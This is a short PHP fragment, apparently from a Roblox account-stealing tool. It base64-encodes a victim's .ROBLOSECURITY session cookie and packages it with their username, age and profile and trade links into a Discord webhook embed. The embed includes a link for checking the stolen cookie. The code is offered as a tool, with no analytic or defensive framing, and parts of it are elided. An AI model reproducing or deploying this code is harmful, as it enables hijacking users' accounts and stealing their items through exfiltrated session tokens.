...
$cookie = base64_encode($roblosecurity);
             ...
             "content" => '',
                "embeds" => [
                    [
                        "title" => "$username ($age)",
                        "type" => "rich",
                        "description" => "[Profile](https://www.roblox.com/users/$userid/profile) | [Trade](https://www.roblox.com/users/$userid/trade) | [Check]($url/controller/check-cookie?cookie=$cookie)",
                        "url" => $discord,
